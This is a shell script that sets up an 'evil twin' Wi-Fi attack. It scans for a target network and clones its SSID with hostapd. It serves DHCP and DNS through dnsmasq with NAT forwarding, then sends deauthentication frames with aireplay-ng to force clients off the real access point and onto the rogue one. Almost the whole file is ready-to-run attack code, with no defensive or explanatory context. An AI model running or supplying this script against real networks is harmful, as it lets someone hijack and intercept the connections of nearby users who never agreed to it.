#!/bin/sh
echo "Please enter the interface to listen to the networks : \n"
read listeningInterface
echo "Please enter the interface to monitor mode : \n"
read deauthInterface
echo "Please enter the interface that will be connected to internet : \n"
read internetInterface

finalESSID=""
finalBSSID=""

select ESSID in $(iwlist ${deauthInterface} scan | grep ESSID)
do
var=${ESSID#*:\"}
finalESSID=${var%\"}
break
done

BSSID=$(iwlist ${deauthInterface} scan | grep -B 5 $finalESSID | grep Address)
finalBSSID=$(echo $BSSID | grep "([A-F0-9][A-F0-9]:){5}[A-F0-9][A-F0-9]" -Eo)

sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -I POSTROUTING -t nat -o ${internetInterface} -j MASQUERADE
sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1

echo "interface=${listeningInterface}" > dnsmasq.conf
echo "dhcp-range=192.168.1.10,192.168.1.100,12h" >> dnsmasq.conf
echo "dhcp-option=6,1.1.1.1" >> dnsmasq.conf
echo "dhcp-option=3,192.168.1.1" >> dnsmasq.conf
echo "server=9.9.9.9" >> dnsmasq.conf
echo "no-resolv" >> dnsmasq.conf

sudo ip addr add 192.168.1.1/24 dev "${listeningInterface}"
sudo dnsmasq -d -C ./dnsmasq.conf& > /dev/null

echo "interface=${listeningInterface}" > hostapd.conf
echo "ssid=${finalESSID}" >> hostapd.conf
echo "hw_mode=g" >> hostapd.conf
echo "channel=11" >> hostapd.conf

sudo hostapd hostapd.conf&
sleep 10

sudo airmon-ng start ${deauthInterface}
deauthInterface=$(ip a | grep "wl.*mon:" -o | cut -d: -f1)
sudo aireplay-ng -0 50 -a ${finalBSSID} ${deauthInterface} -D

sleep 50
